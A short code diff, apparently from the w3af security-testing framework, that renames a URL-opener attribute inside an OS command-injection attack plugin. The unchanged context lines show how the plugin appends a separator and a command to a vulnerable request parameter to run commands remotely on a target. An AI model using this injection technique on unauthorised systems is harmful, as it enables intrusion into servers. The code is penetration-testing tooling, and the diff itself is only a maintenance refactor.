@@ -97,7 +97,7 @@ class osCommandingShell(baseAttackPlugin):
             
             # Create the shell object
             shell_obj = osShell( vuln )
-            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setUrlOpener( self._uri_opener )
             shell_obj.set_cut( self._header_length, self._footer_length )
             return shell_obj
             
@@ -125,7 +125,7 @@ class osCommandingShell(baseAttackPlugin):
             rand = rand + '\n'
             
         # Lets define the result header and footer.
-        functionReference = getattr( self._urlOpener , vuln.getMethod() )
+        functionReference = getattr( self._uri_opener , vuln.getMethod() )
         exploitDc[vuln.getVar()] = command
         try:
             response = functionReference( vuln.getURL(), str(exploitDc) )
@@ -228,7 +228,7 @@ class osShell(exec_shell):
         @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
-        functionReference = getattr( self._urlOpener , self.getMethod() )
+        functionReference = getattr( self._uri_opener , self.getMethod() )
         exploit_dc = self.getDc()
         exploit_dc[ self.getVar() ] = self['separator'] + command
         try:
